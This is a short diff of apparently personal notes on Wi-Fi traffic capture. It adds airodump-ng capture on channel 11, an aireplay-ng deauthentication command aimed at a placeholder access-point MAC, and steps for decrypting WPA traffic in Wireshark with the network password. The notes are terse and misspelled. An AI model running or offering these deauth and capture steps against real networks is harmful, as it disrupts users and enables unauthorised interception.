@@ -2,5 +2,8 @@
 .2 sudo wireshark
 .3 wireshark Preferences Columns wlan_radio.channel
 .4 wireshark Preferences Columns wlan_radio.signal_dbm
+.5 sudo airodump-ng wlan0mon --channel 11 --write push  //connention 11 writlen 
+.6 sudo aireplay-ng  --deauth 180 -a MAC  wlan0mon // 
 
-
+Рассшифровка трафика 
+Wireshark - Perferences Prtotocl - 802.11 - WPA-PASK - password(WI-fi)
